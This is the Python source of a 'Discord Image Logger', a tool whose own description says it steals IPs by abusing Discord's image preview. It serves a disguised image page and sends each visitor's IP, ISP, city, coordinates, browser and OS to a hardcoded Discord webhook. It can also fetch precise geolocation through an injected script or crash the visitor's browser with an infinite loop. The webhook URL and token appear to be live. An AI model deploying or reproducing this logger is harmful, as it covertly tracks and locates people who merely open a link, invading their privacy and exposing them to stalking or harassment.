# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib import parse
import traceback, requests, base64, httpagentparser
import threading

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1091220366984224788/Te54hSoJ1kqvAWLompNzA3aWux7gaiQ9IMgedx76z4grFYQd2dcefXbxnl5tbE4DOVbq",
    "image": "https://imageio.forbes.com/specials-images/imageserve/5d35eacaf1176b0008974b54/0x0.jpg?format=jpg&crop=4560,2565,x790,y784,safe&width=1200",
    "imageArgument": True,

    # CUSTOMIZATION #
    "username": "Image Logger",
    "color": 0x00FFFF,

    # OPTIONS #
    "crashBrowser": False,
    "accurateLocation": False,

    "message": {
        "doMessage": False,
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger",
        "richMessage": True,
    },

    "vpnCheck": 1,
    "linkAlerts": True,
    "buggedImage": True,

    "antiBot": 1,
    
    # REDIRECTION #
    "redirect": {
        "redirect": False,
        "page": "https://your-link.here"
    },
}

blacklistedIPs = ("27", "104", "143", "164")

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    try:
        requests.post(config["webhook"], json={
            "username": config["username"],
            "content": "@everyone",
            "embeds": [{
                "title": "Image Logger - Error",
                "color": config["color"],
                "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
            }],
        })
    except:
        pass

def getIPInfo(ip):
    """Lấy thông tin IP với fallback"""
    try:
        # API chính
        info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857", timeout=5).json()
        if info.get("status") != "fail":
            return info
    except:
        pass
    
    try:
        # API dự phòng
        info = requests.get(f"https://ipapi.co/{ip}/json/", timeout=5).json()
        if "error" not in info:
            # Chuyển đổi định dạng để tương thích
            return {
                "isp": info.get("org", "Unknown"),
                "as": info.get("asn", "Unknown"),
                "country": info.get("country_name", "Unknown"),
                "regionName": info.get("region", "Unknown"),
                "city": info.get("city", "Unknown"),
                "lat": info.get("latitude", "Unknown"),
                "lon": info.get("longitude", "Unknown"),
                "timezone": info.get("timezone", "Unknown"),
                "mobile": info.get("mobile", False),
                "proxy": info.get("proxy", False),
                "hosting": info.get("hosting", False),
                "status": "success"
            }
    except:
        pass
    
    return {"status": "fail", "message": "Could not fetch IP info"}

def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
    try:
        # Chặn IP nội bộ và localhost
        if ip.startswith(("127.", "192.168.", "10.", "172.16.", "172.17.", "172.18.", "172.19.", 
                         "172.20.", "172.21.", "172.22.", "172.23.", "172.24.", "172.25.", 
                         "172.26.", "172.27.", "172.28.", "172.29.", "172.30.", "172.31.", 
                         "169.254.", "::1", "fc00:", "fd00:", "fe80:")):
            print(f"[INFO] Blocked internal IP: {ip}")
            return None
        
        if ip.startswith(blacklistedIPs):
            return None
        
        bot = botCheck(ip, useragent)
        
        if bot:
            if config["linkAlerts"]:
                requests.post(config["webhook"], json={
                    "username": config["username"],
                    "content": "",
                    "embeds": [{
                        "title": "Image Logger - Link Sent",
                        "color": config["color"],
                        "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
                    }],
                })
            return None

        ping = "@everyone"
        info = getIPInfo(ip)
        
        if info.get("status") == "fail":
            # Gửi embed đơn giản khi API fail
            embed = {
                "username": config["username"],
                "content": "@everyone",
                "embeds": [{
                    "title": "Image Logger - IP Logged (Limited Info)",
                    "color": config["color"],
                    "description": f"""**A User Opened the Original Image!**

**IP:** `{ip}`
**Endpoint:** `{endpoint}`
**User Agent:** ```{useragent[:500] if useragent else 'Unknown'}```
**Note:** Limited information available for this IP""",
                }],
            }
            requests.post(config["webhook"], json=embed)
            return info
            
        if info.get("proxy", False):
            if config["vpnCheck"] == 2:
                return None
            if config["vpnCheck"] == 1:
                ping = ""
        
        if info.get("hosting", False):
            if config["antiBot"] == 4:
                if info.get("proxy", False):
                    pass
                else:
                    return None
            elif config["antiBot"] == 3:
                return None
            elif config["antiBot"] == 2:
                if info.get("proxy", False):
                    pass
                else:
                    ping = ""
            elif config["antiBot"] == 1:
                ping = ""

        try:
            os, browser = httpagentparser.simple_detect(useragent)
        except:
            os, browser = "Unknown", "Unknown"
        
        # Xử lý timezone an toàn
        timezone_str = "Unknown"
        timezone = info.get('timezone', '')
        if timezone and '/' in timezone:
            try:
                parts = timezone.split('/')
                timezone_str = f"{parts[1].replace('_', ' ')} ({parts[0]})"
            except:
                timezone_str = "Unknown"
        
        embed = {
            "username": config["username"],
            "content": ping,
            "embeds": [{
                "title": "Image Logger - IP Logged",
                "color": config["color"],
                "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info.get('isp', 'Unknown')}`
> **ASN:** `{info.get('as', 'Unknown')}`
> **Country:** `{info.get('country', 'Unknown')}`
> **Region:** `{info.get('regionName', 'Unknown')}`
> **City:** `{info.get('city', 'Unknown')}`
> **Coords:** `{f"{info.get('lat', 'Unknown')}, {info.get('lon', 'Unknown')}" if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps](https://www.google.com/maps/search/google+map++' + coords.replace(' ', '+') + ')'})
> **Timezone:** `{timezone_str}`
> **Mobile:** `{info.get('mobile', 'Unknown')}`
> **VPN:** `{info.get('proxy', 'Unknown')}`
> **Bot:** `{'Yes' if info.get('hosting') and not info.get('proxy') else 'Possibly' if info.get('hosting') else 'No'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent[:950] if useragent else 'Unknown'}
```""",
            }],
        }
        
        if url:
            embed["embeds"][0]["thumbnail"] = {"url": url}
        
        requests.post(config["webhook"], json=embed)
        return info
        
    except Exception as e:
        print(f"[ERROR] makeReport: {str(e)}")
        reportError(traceback.format_exc())
        return None

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    try:
                        url = base64.b64decode((dic.get("url") or dic.get("id")).encode()).decode()
                    except:
                        url = config["image"]
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            # Get IP address safely
            ip = "Unknown"
            if self.headers.get('x-forwarded-for'):
                ip = self.headers.get('x-forwarded-for').split(',')[0].strip()
            else:
                ip = self.client_address[0]
            
            useragent = self.headers.get('user-agent', 'Unknown')
            endpoint = self.path.split('?')[0] if '?' in self.path else self.path
            
            if ip != "Unknown" and ip.startswith(blacklistedIPs):
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                self.wfile.write(data)
                return
            
            if ip != "Unknown" and botCheck(ip, useragent):
                self.send_response(200 if config["buggedImage"] else 302)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url)
                self.end_headers()
                
                if config["buggedImage"]:
                    self.wfile.write(binaries["loading"])
                
                # Run in thread to avoid blocking
                threading.Thread(target=makeReport, args=(ip, useragent, None, endpoint, url)).start()
                return
            
            # Check for coordinates
            s = self.path
            dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
            coords = None
            
            if dic.get("g") and config["accurateLocation"]:
                try:
                    coords = base64.b64decode(dic.get("g").encode()).decode()
                except:
                    pass
            
            # Run report in thread
            result = None
            if ip != "Unknown":
                if coords:
                    result = makeReport(ip, useragent, coords, endpoint, url)
                else:
                    result = makeReport(ip, useragent, None, endpoint, url)
            
            # Prepare message
            message = config["message"]["message"]
            
            if config["message"]["richMessage"] and result:
                message = message.replace("{ip}", ip)
                message = message.replace("{isp}", str(result.get("isp", "Unknown")))
                message = message.replace("{asn}", str(result.get("as", "Unknown")))
                message = message.replace("{country}", str(result.get("country", "Unknown")))
                message = message.replace("{region}", str(result.get("regionName", "Unknown")))
                message = message.replace("{city}", str(result.get("city", "Unknown")))
                message = message.replace("{lat}", str(result.get("lat", "Unknown")))
                message = message.replace("{long}", str(result.get("lon", "Unknown")))
                
                timezone = result.get("timezone", "Unknown")
                if timezone != "Unknown" and '/' in timezone:
                    try:
                        tz_parts = timezone.split('/')
                        message = message.replace("{timezone}", f"{tz_parts[1].replace('_', ' ')} ({tz_parts[0]})")
                    except:
                        message = message.replace("{timezone}", "Unknown")
                else:
                    message = message.replace("{timezone}", "Unknown")
                    
                message = message.replace("{mobile}", str(result.get("mobile", "Unknown")))
                message = message.replace("{vpn}", str(result.get("proxy", "Unknown")))
                message = message.replace("{bot}", str('Yes' if result.get('hosting') and not result.get('proxy') else 'Possibly' if result.get('hosting') else 'No'))
                
                try:
                    os, browser = httpagentparser.simple_detect(useragent)
                    message = message.replace("{browser}", browser)
                    message = message.replace("{os}", os)
                except:
                    message = message.replace("{browser}", "Unknown")
                    message = message.replace("{os}", "Unknown")

            datatype = 'text/html'

            if config["message"]["doMessage"]:
                data = message.encode()
            
            if config["crashBrowser"]:
                data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>'

            if config["redirect"]["redirect"]:
                data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
            
            self.send_response(200)
            self.send_header('Content-type', datatype)
            self.end_headers()

            if config["accurateLocation"] and not coords:
                data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
            if (currenturl.includes("?")) {
                currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
            } else {
                currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
            }
            location.replace(currenturl);
        });
    }
}
</script>"""
            
            self.wfile.write(data)
        
        except Exception as e:
            print(f"[ERROR] handleRequest: {str(e)}")
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

    def do_GET(self):
        self.handleRequest()
    
    def do_POST(self):
        self.handleRequest()
    
    def log_message(self, format, *args):
        # Disable default logging
        pass

def run_server(port=8080):
    server = HTTPServer(('0.0.0.0', port), ImageLoggerAPI)
    print(f"[*] Server started on port {port}")
    print(f"[*] {__app__} v{__version__} by {__author__}")
    print(f"[*] Description: {__description__}")
    print(f"[!] WARNING: This tool is for educational purposes only!")
    print(f"[!] Do not use it to track people without their consent!")
    print(f"[*] Webhook: {config['webhook']}")
    print(f"[*] Image URL: {config['image']}")
    print(f"[*] Press Ctrl+C to stop the server")
    print("=" * 60)
    
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] Server stopped")
        server.server_close()

if __name__ == '__main__':
    # Install required packages if missing
    try:
        import httpagentparser
    except ImportError:
        print("[!] Required package 'httpagentparser' not found!")
        print("[*] Install it using: pip install httpagentparser")
        exit(1)
    
    run_server()
